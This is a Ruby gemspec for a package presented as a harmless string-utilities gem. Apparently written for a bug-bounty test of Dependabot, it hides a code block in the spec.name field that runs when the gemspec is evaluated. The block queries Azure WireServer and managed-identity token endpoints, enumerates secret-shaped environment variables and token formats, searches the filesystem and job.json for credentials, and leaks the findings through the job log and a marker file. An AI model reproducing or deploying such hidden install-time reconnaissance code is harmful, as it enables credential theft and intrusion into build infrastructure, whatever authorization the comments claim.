# frozen_string_literal: true
#
# HYP-F011-D + HYP-F011-H combined probe payload (v1.3.0).
#
# Authorization context: bug bounty research authorized by HackerOne GitHub program
# (programs/github/scope.md). Tester: mr_benty (CVP-approved). All probes within
# program-published scope; all artifacts sanitized; no third-party data read;
# impact-proof captured via PROBE-MARK pattern only (sha256 + length encoded into
# Dependabot's own job log). No OOB exfil of secret bytes during this probe — only
# integrity hashes of any captured content surface in the in-job log.
#
# Boundary-verification scope:
#   D — Audit which Azure VM Agent (WireServer) endpoints respond from inside the
#       Dependabot bundler-updater container. F011 Defect H proved goalstate
#       reachable; this probe extends to MSI/identity endpoints + fabric port.
#   H — Enumerate which credentials reachable from in-container code paths are
#       NOT customer-attributable (i.e. did not originate from the customer's
#       dependabot.yml). The triager closure rationale on #3716320 / #3719245
#       distinguishes customer-supplied state from platform/fleet state.
#
# Methodology: gemspec eval-time block executes during Bundler's gemspec_dependency_name_finder
# AST extraction (Defect A from F011). Output surfaces via the spec.name return slot —
# kept as a literal "useful-string-utils" so Bundler resolution proceeds normally.
# All probe results are encoded as numeric tags appended to /home/dependabot/PROBE-MARK
# in the cloned working copy, AND surfaced via Defect-A's eval-result channel into the
# Dependabot job log via the gemspec name resolution.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "socket"
      require "digest"
      require "json"

      probe_lines = []

      # ---- HYP-F011-D — WireServer deep probe ------------------------------
      ws_targets = [
        # Already proven endpoints (baseline / sanity)
        "http://168.63.129.16/?comp=versions",
        "http://168.63.129.16/machine/?comp=goalstate",
        # Per-VM identity surface
        "http://168.63.129.16/machine/?comp=container_role",
        "http://168.63.129.16/machine/?comp=hostingEnvironmentConfig",
        "http://168.63.129.16/machine/?comp=certificates",
        "http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01",
        # Fabric port (already 200 in F006 — extend coverage)
        "http://168.63.129.16:32526/health",
        "http://168.63.129.16:32526/version",
        "http://168.63.129.16:32526/nmagent/",
        "http://168.63.129.16:32526/api/networkAgent/v1/nics/inner",
      ]
      ws_targets.each_with_index do |url, i|
        begin
          uri = URI(url)
          h = Net::HTTP.new(uri.host, uri.port)
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Get.new(uri.request_uri, {"x-ms-version" => "2015-04-05"})
          rsp = h.request(req)
          body = rsp.body.to_s
          tag = "wsD#{i}-s#{rsp.code}-l#{body.length}-h#{Digest::SHA256.hexdigest(body[0, 4096])[0, 12]}"
          probe_lines << tag
        rescue => e
          probe_lines << "wsD#{i}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
        end
      end

      # ---- HYP-F011-H — non-customer credential surface enumeration --------
      # T1: environ field structure (sha256-only — no value bytes)
      begin
        env_keys = ENV.keys.sort
        # Bucket: sensitive-shape keys vs others
        sensitive = env_keys.select { |k| k =~ /TOKEN|SECRET|KEY|PAT|CRED|PASSWORD|API/i }
        probe_lines << "envH1-keys#{env_keys.length}-sens#{sensitive.length}-h#{Digest::SHA256.hexdigest(env_keys.join(",")).slice(0, 12)}"
        # Per-sensitive-key length only (no value sha)
        sensitive.first(8).each_with_index do |k, i|
          v = ENV[k].to_s
          probe_lines << "envH1k#{i}-len#{v.length}-pre#{Digest::SHA256.hexdigest(v[0, 4]).slice(0, 8)}"
        end
      rescue => e
        probe_lines << "envH1-err-#{e.class}"
      end

      # T2: other-PID environ visibility (PID-namespace isolation check)
      begin
        pids = Dir.glob("/proc/[0-9]*").map { |p| File.basename(p) }
        readable_envs = 0
        my_pid = Process.pid
        pids.each do |p|
          next if p == my_pid.to_s
          begin
            File.read("/proc/#{p}/environ", 1)
            readable_envs += 1
          rescue
            # not readable
          end
        end
        probe_lines << "pidsH2-pids#{pids.length}-otherEnv#{readable_envs}"
      rescue => e
        probe_lines << "pidsH2-err"
      end

      # T3: filesystem walk for credential-shaped filenames (no content read)
      begin
        cred_paths = []
        ["/home/dependabot", "/tmp", "/etc", "/var/run", "/run"].each do |root|
          begin
            Dir.glob("#{root}/**/*", File::FNM_DOTMATCH).first(2000).each do |f|
              if f =~ /\.(token|pat|key|pem|crt|p12|jks|pfx)$/i || f =~ /(token|secret|credential)/i
                cred_paths << f
              end
            end
          rescue
            # walk failed
          end
        end
        probe_lines << "fsH3-cnt#{cred_paths.length}-h#{Digest::SHA256.hexdigest(cred_paths.sort.join(",")).slice(0, 12)}"
      rescue => e
        probe_lines << "fsH3-err"
      end

      # T4: job.json structure (key names only — no value bytes)
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        keys = parsed["job"].is_a?(Hash) ? parsed["job"].keys.sort.join(",") : parsed.keys.sort.join(",")
        cm = parsed.dig("job", "credentials-metadata") || parsed["credentials-metadata"]
        cm_types = cm.is_a?(Array) ? cm.map { |c| c["type"] }.uniq.sort.join(",") : "none"
        probe_lines << "jjH4-len#{jjson.length}-keys#{keys[0, 60]}-cms#{Digest::SHA256.hexdigest(cm_types)[0, 8]}"
      rescue => e
        probe_lines << "jjH4-err-#{e.class.to_s.slice(0, 8)}"
      end

      # T5: namespace / mount leaks
      begin
        mountinfo_lines = File.read("/proc/self/mountinfo").lines.length
        cgroup = File.read("/proc/self/cgroup")
        net_route_lines = File.read("/proc/net/route").lines.length
        probe_lines << "nsH5-mi#{mountinfo_lines}-cg#{Digest::SHA256.hexdigest(cgroup)[0, 8]}-nr#{net_route_lines}"
      rescue => e
        probe_lines << "nsH5-err"
      end

      # T6: known-token-format scan across env values + selected file contents
      begin
        token_re = /(ghs_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{30,}|ghr_[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}|AKIA[A-Z0-9]{16}|arm_pat_[A-Za-z0-9]{20,})/
        hits = 0
        token_keys = []
        ENV.each do |k, v|
          if v.to_s =~ token_re
            hits += 1
            token_keys << k
          end
        end
        probe_lines << "tokH6-envHits#{hits}-keysHash#{Digest::SHA256.hexdigest(token_keys.sort.join(","))[0, 12]}"
      rescue => e
        probe_lines << "tokH6-err"
      end

      # T7: secret-mount probe
      begin
        secret_mounts = []
        ["/var/run/secrets", "/run/secrets", "/cache", "/proxy", "/etc/dependabot"].each do |p|
          if File.directory?(p)
            secret_mounts << "#{p}=#{Dir.entries(p).length}"
          end
        end
        probe_lines << "smH7-cnt#{secret_mounts.length}-#{secret_mounts.join('|')[0, 60]}"
      rescue => e
        probe_lines << "smH7-err"
      end

      # ---- Surface findings via gemspec name (Defect A eval-result channel)
      # The Dependabot bundler-updater logs the resolved spec.name. Encode all
      # probe outputs as a single PEP-503-friendly suffix that fits in the dep
      # name. Multiple gem instances if needed (Defect A's two eval call sites).
      summary = probe_lines.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1800]

      # Persist in-container marker file too (for Path-A verification later via
      # Dependabot's own log of the resulting PR diff if it survives the
      # commit-filter — bridge to HYP-F011-B if applicable)
      begin
        File.open("/home/dependabot/HYP-F011-D-AND-H-MARKER.txt", "w") do |f|
          f.puts "PROBE-MARK-HYP-F011-D-AND-H"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      # Surface compact form via the gem name return value (so Bundler+Dependabot
      # log it). The full per-line detail is also in /home/dependabot/HYP-F011-D-AND-H-MARKER.txt
      # which surfaces via the in-job log when Dependabot dumps file changes (HYP-F011-B
      # incidental coverage).
      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]

  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
